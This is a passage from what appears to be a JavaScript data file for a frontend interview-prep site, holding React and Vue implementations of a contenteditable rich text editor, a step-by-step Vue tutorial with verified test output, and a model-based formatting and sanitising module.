
// Paste as plain text: the safest sanitiser is not accepting markup at all.
export function pastePlain(root, text) {
  const s = document.getSelection();
  if (!s || !s.rangeCount || !root.contains(s.anchorNode)) return;
  const r = s.getRangeAt(0);
  r.deleteContents();
  const node = document.createTextNode(text);
  r.insertNode(node);
  r.setStartAfter(node);
  r.collapse(true);
  s.removeAllRanges();
  s.addRange(r);
}
export const INITIAL = [
  {
    type: "p",
    runs: [
      { text: "Release notes for " },
      { text: "version 2", b: true },
      { text: " are ready." },
    ],
  },
  { type: "p", runs: [{ text: "Fixed the date picker" }] },
  { type: "p", runs: [{ text: "Faster spreadsheet recalculation" }] },
];
`,
          "/src/RichTextEditor.js": `import { useEffect, useRef, useState } from "react";
import {
  INITIAL,
  activeState,
  parse,
  pastePlain,
  readSelection,
  render,
  runCommand,
} from "./editor";

const TOOLS = [
  { cmd: "b", label: "Bold", text: "B", key: "b" },
  { cmd: "i", label: "Italic", text: "I", key: "i" },
  { cmd: "u", label: "Underline", text: "U", key: "u" },
  { cmd: "ul", label: "Bulleted list", text: "• List" },
  { cmd: "ol", label: "Numbered list", text: "1. List" },
];

export default function RichTextEditor({ onChange }) {
  // React never renders children into this div: the DOM owns typing
  const ref = useRef(null);
  const [active, setActive] = useState({
    b: false,
    i: false,
    u: false,
    block: "p",
  });

  function refresh() {
    const root = ref.current;
    if (!root) return;
    const blocks = parse(root);
    setActive(activeState(blocks, readSelection(root)));
    onChange?.(render(blocks));
  }

  useEffect(() => {
    const root = ref.current;
    // guarded: StrictMode runs this twice
    if (!root.innerHTML) root.innerHTML = render(INITIAL);
    refresh();
    const onSel = () => {
      if (root.contains(document.getSelection()?.anchorNode)) refresh();
    };
    document.addEventListener("selectionchange", onSel);
    return () => document.removeEventListener("selectionchange", onSel);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  function exec(cmd) {
    if (runCommand(ref.current, cmd)) refresh();
  }
  function onKeyDown(e) {
    const tool = TOOLS.find((t) => t.key && t.key === e.key.toLowerCase());
    if (tool && (e.ctrlKey || e.metaKey) && !e.altKey) {
      e.preventDefault();
      exec(tool.cmd);
    }
  }
  function onPaste(e) {
    e.preventDefault();
    pastePlain(ref.current, e.clipboardData?.getData("text/plain") || "");
    refresh();
  }
  const pressed = (cmd) =>
    cmd === "ul" || cmd === "ol" ? active.block === cmd : active[cmd];

  return (
    <div className="rte">
      <div
        role="toolbar"
        aria-label="Formatting"
        aria-controls="rte-body"
        className="rte-tools"
      >
        {TOOLS.map((t) => (
          <button
            key={t.cmd}
            type="button"
            aria-label={t.label}
            aria-pressed={pressed(t.cmd)}
            data-cmd={t.cmd}
            title={t.key ? \`\${t.label} (Ctrl+\${t.key.toUpperCase()})\` : t.label}
            onMouseDown={
              (e) => e.preventDefault() /* keep the editor selection */
            }
            onClick={() => exec(t.cmd)}
          >
            <span className={"t-" + t.cmd}>{t.text}</span>
          </button>
        ))}
      </div>
      <div
        id="rte-body"
        ref={ref}
        className="rte-body"
        contentEditable
        suppressContentEditableWarning
        role="textbox"
        aria-multiline="true"
        aria-label="Release notes"
        data-testid="editor"
        onInput={refresh}
        onKeyDown={onKeyDown}
        onKeyUp={refresh}
        onMouseUp={refresh}
        onPaste={onPaste}
      />
    </div>
  );
}
`,
        },
      },
      vue: {
        answer: `**Target Audience:** Vue developers preparing for a machine coding round. Assumes \`<script setup>\`, template refs and lifecycle hooks.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: this Vue 3.5.44 component in jsdom, driven by a script, and the same component in headless Chromium 141 with real typing and clicks.

## 1. Why This Even Matters — A Story First

A shared notebook where anyone can ask the secretary to bold a sentence stays readable only if the secretary rewrites the page neatly each time, in one approved handwriting, instead of scribbling over it. In an editor, \`contenteditable\` is the notebook: the browser handles typing, the caret and IME input. Formatting is the secretary: read the DOM into a small model, change the model, write clean HTML back, and put the selection back.

\`document.execCommand("bold")\` is the shortcut most tutorials use. MDN marks it deprecated, browsers disagree on its markup, and jsdom does not implement it (\`typeof document.execCommand\` printed \`undefined\`). This build does not use it.

## 2. Plan and the Vue Model

| Piece | Vue tool | Notes |
| :--- | :--- | :--- |
| Editable element | \`useTemplateRef("body")\`, **no template children** | Vue never patches inside it, so typing and rendering never fight. |
| Content | Read on demand with \`parse(root)\` | The DOM is the source of truth between commands. |
| Toolbar state | \`reactive({ b, i, u, block })\` | Updated with \`Object.assign\` on every refresh. |
| Output | \`emit("change", html)\` | Normalised, allow-listed HTML. |

📌 **Interview term: Document model** — \`block = { type: "p" | "ul" | "ol", runs: [{ text, b, i, u }] }\`. A run is a stretch of text with one set of marks. The model and its commands live in \`editor.js\`, shared unchanged with the React version.

📌 **Interview term: useTemplateRef** — Vue 3.5's way to get an element by its \`ref\` name, with better typing than a same-named \`ref()\` ([useTemplateRef](/interview-question/what-is-usetemplateref-vue-3-5-and-how-does-it-improve-on-ref)).

## 3. Build It Step by Step

### 3.1 Parse and render

\`parse(root)\` walks the DOM. Each element is one of three things:

- A known mark (\`STRONG\`, \`B\`, \`EM\`, \`I\`, \`U\`) becomes a flag on the run.
- A known block (\`P\`, \`DIV\`, \`UL\`/\`OL\` items) becomes a block.
- Anything else is unwrapped to its text, and \`SCRIPT\` and \`STYLE\` are dropped with their contents.

Attributes are never read. \`render(blocks)\` escapes text and writes marks in one fixed order (\`strong\`, then \`em\`, then \`u\`). Same content, same HTML.

📌 **Interview term: Sanitising by construction** — the output can only contain what the renderer writes, so there is no deny-list to keep up to date. This is also why the editor does not use \`v-html\` to display content ([the risk of v-html](/interview-question/what-is-v-html-and-what-is-the-risk-of-using-it)).

### 3.2 Selection to model positions

\`\`\`js
function toPos(root, node, offset) {
  const els = blockEls(root); // p, ul > li, ol > li
  const el = els.find((e) => e === node || e.contains(node));
  const r = document.createRange();
  r.setStart(el, 0);
  r.setEnd(node, offset);
  return { b: els.indexOf(el), o: r.toString().length };
}
\`\`\`

Replacing \`innerHTML\` destroys the text nodes the Selection pointed at. So each command saves \`{ start: { b, o }, end: { b, o } }\` first, and afterwards walks text nodes with a \`TreeWalker\` to rebuild a \`Range\` at the same character offsets.

📌 **Interview term: Selection and Range** — the Selection is what the user highlighted; a Range is a pair of \`(container, offset)\` points. Restoring a selection means \`removeAllRanges()\` and then \`addRange(newRange)\`.

### 3.3 Pure commands

- **\`toggleMark(blocks, sel, mark)\`** splits runs at the selection edges, then works all-or-nothing. If every selected character has the mark, it removes it; otherwise it adds it everywhere.
- **\`expandToWord\`** turns a bare caret into the word around it, Google Docs style.
- **\`toggleList\`** converts every touched block to the list type, or back to paragraphs if they all already had it.

📌 **Interview term: Run splitting** — a run crossing a selection edge is cut into before, inside and after pieces. Only the inside piece changes, and equal neighbours are merged again.

### 3.4 The component

\`\`\`vue
<script setup>
const emit = defineEmits(["change"]);
const body = useTemplateRef("body");
const active = reactive({ b: false, i: false, u: false, block: "p" });

function refresh() {
  const blocks = parse(body.value);
  Object.assign(active, activeState(blocks, readSelection(body.value)));
  emit("change", render(blocks));
}
const onSel = () => {
  if (body.value?.contains(document.getSelection()?.anchorNode))
    refresh();
};
onMounted(() => {
  body.value.innerHTML = render(INITIAL);
  refresh();
  document.addEventListener("selectionchange", onSel);
});
onBeforeUnmount(() =>
  document.removeEventListener("selectionchange", onSel),
);
function exec(cmd) {
  if (runCommand(body.value, cmd)) refresh();
}
</script>

<template>
  <div role="toolbar" aria-label="Formatting" aria-controls="rte-body">
    <button
      v-for="t in TOOLS"
      :key="t.cmd"
      type="button"
      :aria-label="t.label"
      :aria-pressed="pressed(t.cmd)"
      @mousedown.prevent
      @click="exec(t.cmd)"
    >
      {{ t.text }}
    </button>
  </div>
  <div
    id="rte-body"
    ref="body"
    contenteditable="true"
    role="textbox"
    aria-multiline="true"
    aria-label="Release notes"
    @input="refresh"
    @keydown="onKeyDown"
    @keyup="refresh"
    @mouseup="refresh"
    @paste.prevent="onPaste"
  ></div>
</template>
\`\`\`

📌 **Interview term: Event modifiers** — \`@mousedown.prevent\` stops the button from taking focus and collapsing the editor selection before \`@click\` runs. \`@paste.prevent\` blocks the browser's rich paste so \`onPaste\` can insert \`clipboardData.getData("text/plain")\` as a text node ([event modifiers](/interview-question/how-do-you-handle-events-in-vue-v-on-and-event-modifiers)).

\`selectionchange\` fires on \`document\`, not on the element. That is why it is added in \`onMounted\` and removed in \`onBeforeUnmount\`, and why the handler checks that the selection is inside this editor.

\`runCommand\` saves the selection, focuses the editor if needed, then restores the selection. In jsdom, calling \`focus()\` on the editable element reset the selection, and the first version formatted nothing from the keyboard because of it.

## 4. Verified

jsdom has Selection and Range but no editing. The driver set selections with the Selection API, fired \`selectionchange\`, and clicked real toolbar buttons. The paste event carried a fake \`clipboardData\` object, because jsdom has no \`DataTransfer\`. React and Angular printed identical lines:

\`\`\`text
initial: <p>Release notes for <strong>version 2</strong> are ready.</p><p>Fixed the date picker</p><p>Faster spreadsheet recalculation</p>
paste ' <b>bold?</b>' -> Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</p>
select 'sion' -> pressed: b
Bold on 'Release' -> <p><strong>Release</strong> notes for <strong>version 2</strong> are ready. | selection kept: "Release" | pressed: b
select mixed -> pressed: none
Bold on mixed (makes all bold) -> <p><strong>Release notes for version 2</strong> are ready.
Bold again (removes) -> <p>Release notes for version<strong> 2</strong> are ready.
caret in 'notes' + Ctrl+I -> <p>Release <em>notes</em> for version<strong> 2</strong> are ready. | pressed: i
Bulleted list on 2 blocks -> <ul><li>Fixed the date picker</li><li>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</li></ul> | pressed: ul
Numbered list -> <ol><li>Fixed the date picker</li><li>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</li></ol>
Numbered again (back to paragraphs) -> <p>Fixed the date picker</p><p>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</p>
U then I on 'Faster' -> <p><em><u>Faster</u></em> &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation | pressed: i,u
model output after hostile insert -> <p>Hi <strong>there</strong></p>
\`\`\`

Headless Chromium 141 (playwright-core), with real key presses and clicks:

\`\`\`text
[chromium:vue] version: 141.0.7390.37
[chromium:vue] type ' Thanks!', Shift+Left x7, Ctrl+B -> <p>Release notes for <strong>version 2</strong> are ready. <strong>Thanks!</strong>
[chromium:vue]   selection after: "Thanks!" | Bold pressed: true
[chromium:vue] ArrowRight, type ' Bye' -> <p>Release notes for <strong>version 2</strong> are ready. <strong>Thanks! Bye</strong>
[chromium:vue] click Bulleted list -> <ul><li>Faster spreadsheet recalculation</li></ul> | focus in editor: editor
[chromium:vue] End, Enter, type 'New item' -> <ul><li>Faster spreadsheet recalculation</li><li>New item</li></ul>
[chromium:vue]   model output: <ul><li>Faster spreadsheet recalculation</li><li>New item</li></ul>
[chromium:vue]   focused button: Italic
[chromium:vue] Space on Italic -> <p><em>Fixed</em> the date picker</p> | focus back in editor: editor | selection: "Fixed"
[chromium:vue] console errors: none
\`\`\`

Typing after Ctrl+B extended the bold run, Enter in a list item made a new \`<li>\` that the model read back, and a keyboard-only user reached Italic with Shift+Tab and formatted the selected word. Styling and screen reader output were not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Caret only | Mark commands format the word |
| Mixed marks | Add to all, then remove from all |
| Multi-block selection | Lists convert every touched block |
| Hostile markup | \`parse\` drops unknown tags and every attribute |
| Toolbar | \`role="toolbar"\`, \`aria-pressed\`, labelled buttons |
| Editor | \`role="textbox"\`, \`aria-multiline\`, a label and a focus ring |

## 6. Common Pitfalls

- **Rendering the content with \`v-html\` or interpolation inside the editable element.** Vue would patch the nodes the user is typing into.
- **Saving DOM nodes as the selection.** They are gone after \`innerHTML\` changes; save model positions.
- **Missing \`.prevent\` on toolbar \`mousedown\`.** The selection collapses before the click.
- **Listening for \`selectionchange\` on the editor element.** It fires on \`document\`.
- **Deny-list sanitising.** Allow-list by construction instead.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Reject execCommand:</strong> <span style="color:#f0e2c8;">"It is deprecated and inconsistent. Let <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">contenteditable</code> own typing and take over formatting."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Model:</strong> <span style="color:#f0e2c8;">"Blocks of runs, a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">parse</code> that keeps only known tags, and a canonical <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">render</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Selection:</strong> <span style="color:#f0e2c8;">"Save <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">{ block, offset }</code> before a command and rebuild a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Range</code> after rendering."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Commands:</strong> <span style="color:#f0e2c8;">"All-or-nothing <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleMark</code> with run splitting, a caret that formats its word, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleList</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Vue layer:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">useTemplateRef</code> with no children, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@mousedown.prevent</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@paste.prevent</code> for plain text, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">selectionchange</code> on <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">document</code> for <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-pressed</code>."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you make it work with <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">v-model</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Use <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">defineModel()</code> and emit on change, but only write the incoming value into <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">innerHTML</code> when it differs from what the editor last emitted, or typing loops back and resets the caret.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add undo?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Programmatic DOM changes are not on the browser undo stack. Keep a stack of models plus selections, and push before each command and after typing pauses.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not render the model with Vue?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Patching under the caret breaks typing and IME composition. Model-first libraries map selections through every change, and that is a much bigger build.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add links?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Add an <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">href</code> to runs, allow only <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">http</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">https</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mailto</code> schemes, and render <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">rel="noopener noreferrer"</code>.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Document model** | Blocks of text runs with mark flags |
| **useTemplateRef** | Get an element by its ref name |
| **Sanitising by construction** | Only renderer-written tags can appear |
| **Selection and Range** | Highlighted area as container and offset pairs |
| **Run splitting** | Cutting runs at selection edges |
| **Event modifiers** | \`.prevent\`, \`.stop\` on listeners |

---
**Conclusion:** The Vue editor leaves typing to the browser and handles formatting itself: parse to a small model, save the selection as model positions, run a pure command, render canonical HTML, and restore the selection. The component's job is restraint: no template children in the editable element, \`.prevent\` on the toolbar's \`mousedown\` and on paste, and a \`selectionchange\` listener for the toolbar's pressed states. jsdom and real Chromium both confirmed the behaviour.`,
        files: {
          "/src/App.vue": `<script setup>
import { ref } from "vue";
import RichTextEditor from "./components/RichTextEditor.vue";

const html = ref("");
</script>

<template>
  <main class="page">
    <h1 style="font-size: 18px">Write release notes</h1>
    <RichTextEditor @change="html = $event" />
    <p class="out" data-testid="out">{{ html }}</p>
  </main>
</template>

<style>
body {
  margin: 0;
  background: #0f1115;
  color: #e6e6e6;
  font-family: system-ui, sans-serif;
}
.page {
  max-width: 680px;
  margin: 0 auto;
  padding: 20px 16px;
}
.rte {
  border: 1px solid #2c3340;
  border-radius: 10px;
  background: #171a21;
  overflow: hidden;
}
.rte-tools {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
  padding: 6px;
  border-bottom: 1px solid #2c3340;
}
.rte-tools button {
  background: #222834;
  color: #e6e6e6;
  border: 1px solid #2c3340;
  border-radius: 6px;
  padding: 4px 10px;
  min-width: 34px;
  cursor: pointer;
  font:
    14px system-ui,
    sans-serif;
}
.rte-tools button[aria-pressed="true"] {
  background: #f9a825;
  color: #1c140a;
  border-color: #f9a825;
}
.t-b {
  font-weight: 700;
}
.t-i {
  font-style: italic;
}
.t-u {
  text-decoration: underline;
}
.rte-body {
  min-height: 140px;
  padding: 10px 14px;
  outline: none;
  line-height: 1.5;
}
.rte-body:focus-visible {
  box-shadow: inset 0 0 0 2px #f9a825;
}
.rte-body p {
  margin: 0 0 8px;
}
.out {
  margin-top: 12px;
  font:
    12px ui-monospace,
    monospace;
  color: #9aa4b2;
  white-space: pre-wrap;
  word-break: break-word;
}
</style>
`,
          "/src/components/RichTextEditor.vue": `<script setup>
import { onBeforeUnmount, onMounted, reactive, useTemplateRef } from "vue";
import {
  INITIAL,
  activeState,
  parse,
  pastePlain,
  readSelection,
  render,
  runCommand,
} from "../editor.js";

const emit = defineEmits(["change"]); // sanitised HTML after every edit
const TOOLS = [
  { cmd: "b", label: "Bold", text: "B", key: "b" },
  { cmd: "i", label: "Italic", text: "I", key: "i" },
  { cmd: "u", label: "Underline", text: "U", key: "u" },
  { cmd: "ul", label: "Bulleted list", text: "• List" },
  { cmd: "ol", label: "Numbered list", text: "1. List" },
];
// The editable div has no children in the
// template, so Vue never patches inside it.
const body = useTemplateRef("body");
const active = reactive({ b: false, i: false, u: false, block: "p" });

function refresh() {
  const root = body.value;
  if (!root) return;
  const blocks = parse(root);
  Object.assign(active, activeState(blocks, readSelection(root)));
  emit("change", render(blocks));
}
const onSel = () => {
  if (body.value?.contains(document.getSelection()?.anchorNode)) refresh();
};
onMounted(() => {
  body.value.innerHTML = render(INITIAL);
  refresh();
  document.addEventListener("selectionchange", onSel);
});
onBeforeUnmount(() => document.removeEventListener("selectionchange", onSel));

function exec(cmd) {
  if (runCommand(body.value, cmd)) refresh();
}
function onKeyDown(e) {
  const tool = TOOLS.find((t) => t.key && t.key === e.key.toLowerCase());
  if (tool && (e.ctrlKey || e.metaKey) && !e.altKey) {
    e.preventDefault();
    exec(tool.cmd);
  }
}
function onPaste(e) {
  pastePlain(body.value, e.clipboardData?.getData("text/plain") || "");
  refresh();
}
const pressed = (cmd) =>
  cmd === "ul" || cmd === "ol" ? active.block === cmd : active[cmd];
</script>

<template>
  <div class="rte">
    <div
      role="toolbar"
      aria-label="Formatting"
      aria-controls="rte-body"
      class="rte-tools"
    >
      <!-- mousedown.prevent keeps the editor selection when a button is clicked -->
      <button
        v-for="t in TOOLS"
        :key="t.cmd"
        type="button"
        :aria-label="t.label"
        :aria-pressed="pressed(t.cmd)"
        :data-cmd="t.cmd"
        :title="t.key ? \`\${t.label} (Ctrl+\${t.key.toUpperCase()})\` : t.label"
        @mousedown.prevent
        @click="exec(t.cmd)"
      >
        <span :class="'t-' + t.cmd">{{ t.text }}</span>
      </button>
    </div>
    <div
      id="rte-body"
      ref="body"
      class="rte-body"
      contenteditable="true"
      role="textbox"
      aria-multiline="true"
      aria-label="Release notes"
      data-testid="editor"
      @input="refresh"
      @keydown="onKeyDown"
      @keyup="refresh"
      @mouseup="refresh"
      @paste.prevent="onPaste"
    ></div>
  </div>
</template>
`,
          "/src/editor.js": `// A tiny document model for a contenteditable editor, used instead of the
// deprecated document.execCommand. The DOM owns typing; formatting commands
// read the DOM into a model, change the model, and write normalised HTML back.
//   block = { type: "p" | "ul" | "ol", runs: [{ text, b, i, u }] }
const MARK_TAGS = { STRONG: "b", B: "b", EM: "i", I: "i", U: "u" };
const sameMarks = (x, y) =>
  !!x.b === !!y.b && !!x.i === !!y.i && !!x.u === !!y.u;
const textLen = (block) => block.runs.reduce((n, r) => n + r.text.length, 0);

function normalise(runs) {
  const out = [];
  for (const r of runs) {
    if (!r.text) continue;
    const prev = out[out.length - 1];
    if (prev && sameMarks(prev, r)) prev.text += r.text;
    else out.push({ text: r.text, b: !!r.b, i: !!r.i, u: !!r.u });
  }
  return out;
}

// DOM -> model. Anything that is not a known block or mark is unwrapped to
// its text, so pasted spans, styles, scripts and attributes never survive.
export function parse(root) {
  const blocks = [];
  let loose = null; // inline content sitting directly in the root
  const inline = (node, marks, runs) => {
    if (node.nodeType === 3) {
      runs.push({ text: node.nodeValue.replace(/ /g, " "), ...marks });
      return;
    }
    if (
      node.nodeType !== 1 ||
      node.tagName === "SCRIPT" ||
      node.tagName === "STYLE"
    )
      return;
    const m = MARK_TAGS[node.tagName];
    const next = m ? { ...marks, [m]: true } : marks;
    node.childNodes.forEach((c) => inline(c, next, runs));
  };
  const flush = () => {
    if (loose) {
      blocks.push({ type: "p", runs: normalise(loose) });
      loose = null;
    }
  };
  root.childNodes.forEach((n) => {
    const tag = n.nodeType === 1 ? n.tagName : "";
    if (tag === "UL" || tag === "OL") {
      flush();
      n.querySelectorAll("li").forEach((li) => {
        const runs = [];
        li.childNodes.forEach((c) => {
          if (c.nodeType !== 1 || (c.tagName !== "UL" && c.tagName !== "OL"))
            inline(c, {}, runs);
        });
        blocks.push({ type: tag.toLowerCase(), runs: normalise(runs) });
      });
    } else if (
      tag === "P" ||
      tag === "DIV" ||
      /^H[1-6]$/.test(tag) ||
      tag === "BLOCKQUOTE"
    ) {
      flush();
      const runs = [];
      inline(n, {}, runs);
      blocks.push({ type: "p", runs: normalise(runs) });
    } else if (tag === "BR") {
      flush();
    } else {
      if (!loose) loose = [];
      inline(n, {}, loose);
    }
  });
  flush();
  return blocks.length ? blocks : [{ type: "p", runs: [] }];
}

const esc = (s) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
function runHtml(r) {
  let h = esc(r.text);
  if (r.u) h = "<u>" + h + "</u>";
  if (r.i) h = "<em>" + h + "</em>";
  if (r.b) h = "<strong>" + h + "</strong>";
  return h;
}
// Model -> HTML. Consecutive list items of the same type share one list.
export function render(blocks) {
  let html = "",
    open = null;
  for (const bl of blocks) {
    const inner = bl.runs.length ? bl.runs.map(runHtml).join("") : "<br>";
    if (bl.type === "p") {
      if (open) {
        html += "</" + open + ">";
        open = null;
      }
      html += "<p>" + inner + "</p>";
    } else {
      if (open !== bl.type) {
        if (open) html += "</" + open + ">";
        html += "<" + bl.type + ">";
        open = bl.type;
      }
      html += "<li>" + inner + "</li>";
    }
  }
  return html + (open ? "</" + open + ">" : "");
}

// ── Selection <-> model positions { b: block index, o: character offset } ──
const blockEls = (root) => [
  ...root.querySelectorAll(":scope > p, :scope > ul > li, :scope > ol > li"),
];

function toPos(root, node, offset) {
  const els = blockEls(root);
  if (node === root) {
    // caret between blocks: snap to the start of the next one
    const b = Math.min(offset, els.length - 1);
    return { b: Math.max(b, 0), o: 0 };
  }
  const el = els.find((e) => e === node || e.contains(node));
  if (!el) return null;
  const r = document.createRange();
  r.setStart(el, 0);
  r.setEnd(node, offset);
  return { b: els.indexOf(el), o: r.toString().length };
}
function toPoint(root, { b, o }) {
  const el = blockEls(root)[b];
  const walk = document.createTreeWalker(el, NodeFilter.SHOW_TEXT);
  let n,
    seen = 0,
    lastText = null;
  while ((n = walk.nextNode())) {
    lastText = n;
    if (seen + n.nodeValue.length >= o) return [n, o - seen];
    seen += n.nodeValue.length;
  }
  return lastText ? [lastText, lastText.nodeValue.length] : [el, 0];
}
export function readSelection(root) {
  const s = document.getSelection();
  if (!s || !s.rangeCount || !root.contains(s.anchorNode)) return null;
  const r = s.getRangeAt(0);
  const start = toPos(root, r.startContainer, r.startOffset),
    end = toPos(root, r.endContainer, r.endOffset);
  return start && end ? { start, end } : null;
}
export function writeSelection(root, sel) {
  const r = document.createRange();
  r.setStart(...toPoint(root, sel.start));
  r.setEnd(...toPoint(root, sel.end));
  const s = document.getSelection();
  s.removeAllRanges();
  s.addRange(r);
}

// ── Commands (pure: model in, model out) ──
const collapsed = (sel) =>
  sel.start.b === sel.end.b && sel.start.o === sel.end.o;
const isWordChar = (ch) => !!ch && ch !== " ";

// A caret with no selection formats the word it sits in, like Google Docs.
export function expandToWord(blocks, sel) {
  if (!collapsed(sel)) return sel;
  const text = blocks[sel.start.b].runs.map((r) => r.text).join("");
  let s = sel.start.o,
    e = sel.start.o;
  while (isWordChar(text[s - 1])) s--;
  while (isWordChar(text[e])) e++;
  return { start: { b: sel.start.b, o: s }, end: { b: sel.start.b, o: e } };
}

// Character spans [from, to) of each block touched by the selection.
function spans(blocks, sel) {
  const out = [];
  for (let b = sel.start.b; b <= sel.end.b; b++)
    out.push({
      b,
      from: b === sel.start.b ? sel.start.o : 0,
      to: b === sel.end.b ? sel.end.o : textLen(blocks[b]),
    });
  return out;
}
function marksAt(block, from, to) {
  // marks of every character in [from, to)
  const res = [];
  let pos = 0;
  for (const r of block.runs) {
    const a = Math.max(from, pos),
      z = Math.min(to, pos + r.text.length);
    if (a < z) res.push(r);
    pos += r.text.length;
  }
  return res;
}
export function toggleMark(blocks, sel, mark) {
  const parts = spans(blocks, sel).filter((s) => s.from < s.to);
  if (!parts.length) return blocks;
  const all = parts.every((s) =>
    marksAt(blocks[s.b], s.from, s.to).every((r) => r[mark]),
  );
  const next = blocks.map((bl) => ({
    ...bl,
    runs: bl.runs.map((r) => ({ ...r })),
  }));
  for (const s of parts) {
    const runs = [];
    let pos = 0;
    for (const r of next[s.b].runs) {
      // split each run at the span edges, then flip the mark inside
      const cuts = [0, s.from - pos, s.to - pos, r.text.length].map((c) =>
        Math.min(Math.max(c, 0), r.text.length),
      );
      for (let k = 0; k < 3; k++) {
        const piece = r.text.slice(cuts[k], cuts[k + 1]);
        if (piece)
          runs.push({ ...r, text: piece, [mark]: k === 1 ? !all : r[mark] });
      }
      pos += r.text.length;
    }
    next[s.b].runs = normalise(runs);
  }
  return next;
}
export function toggleList(blocks, sel, type) {
  const all = spans(blocks, sel).every((s) => blocks[s.b].type === type);
  return blocks.map((bl, i) =>
    i >= sel.start.b && i <= sel.end.b ? { ...bl, type: all ? "p" : type } : bl,
  );
}
// What the toolbar shows as pressed for the current selection.
export function activeState(blocks, sel) {
  if (!sel) return { b: false, i: false, u: false, block: "p" };
  let runs;
  if (collapsed(sel)) {
    const bl = blocks[sel.start.b],
      o = sel.start.o;
    runs = marksAt(bl, Math.max(o - 1, 0), Math.max(o, 1)).slice(-1);
  } else
    runs = spans(blocks, sel).flatMap((s) =>
      marksAt(blocks[s.b], s.from, s.to),
    );
